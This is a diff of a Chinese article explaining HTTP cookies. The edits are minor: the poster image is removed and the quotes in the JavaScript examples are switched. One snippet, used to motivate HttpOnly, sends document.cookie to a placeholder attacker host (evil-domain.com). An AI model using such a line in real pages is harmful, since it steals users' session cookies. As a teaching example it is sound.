@@ -2,7 +2,7 @@
 title: HTTP Cookie
 description: ""
 tags: ["HTTP"]
-poster: "https://img0.baidu.com/it/u=3542748506,4060302361&fm=253&fmt=auto&app=138&f=JPEG?w=800&h=500"
+poster: ""
 date: 2024/02/01
 ---
 
@@ -153,8 +153,8 @@ cookie 的机制使得服务器无法确认 cookie 是在安全来源上设置�
 通过 ("Document.cookie") 属性可创建新的 Cookie，也可通过该属性访问非`HttpOnly`标记的 Cookie。
 
 ```js
-document.cookie = 'yummy_cookie=choco';
-document.cookie = 'tasty_cookie=strawberry';
+document.cookie = "yummy_cookie=choco";
+document.cookie = "tasty_cookie=strawberry";
 console.log(document.cookie);
 // logs "yummy_cookie=choco; tasty_cookie=strawberry"
 ```
@@ -178,7 +178,7 @@ console.log(document.cookie);
 
 ```js
 new Image().src =
-  'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie;
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 `HttpOnly` 类型的 Cookie 用于阻止了 JavaScript 对其的访问性而能在一定程度上缓解此类攻击。
